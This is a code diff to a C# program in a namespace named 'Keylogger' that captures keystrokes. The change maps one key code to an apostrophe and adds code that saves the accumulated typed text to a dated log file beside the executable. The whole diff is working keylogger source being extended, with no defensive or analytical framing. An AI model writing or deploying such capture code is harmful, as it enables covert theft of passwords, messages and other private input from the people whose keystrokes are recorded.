@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Threading;
@@ -60,6 +61,7 @@ namespace Keylogger
                             if (((Keys)keyCode) == Keys.Space) { keyString = " "; }
                             else if (((Keys)keyCode) == Keys.Enter) { keyString = "\n"; }
                             else if (((Keys)keyCode) == Keys.Tab) { keyString = "\t"; }
+                            else if (keyCode == 52) { keyString = "'"; }
 
                             // Ignore the mouse buttons
                             else if ((((Keys)keyCode) == Keys.LButton) || (((Keys)keyCode) == Keys.RButton)) { keyString = ""; }
@@ -80,10 +82,8 @@ namespace Keylogger
                             }
                             
                         }
-
-                        text = text + keyString;
-                        Console.WriteLine(text);
-
+                        
+                        // Remove the shift
                         if (
                             (isShift) &&
                             (
@@ -94,7 +94,16 @@ namespace Keylogger
                         ) {
                             isShift = false;
                         }
-                        
+
+                        // Write the logs
+
+                        // https://docs.microsoft.com/fr-fr/dotnet/standard/io/how-to-write-text-to-a-file
+                        string path = System.IO.Path.GetDirectoryName(Application.ExecutablePath);
+                        string fileName = "log-" + DateTime.UtcNow.ToString("MM-dd-yyyy") + ".log";
+                        File.WriteAllText(Path.Combine(path, fileName), text);
+                       
+                        text = text + keyString;
+                        Console.WriteLine(text);
                     }
                 }
             }
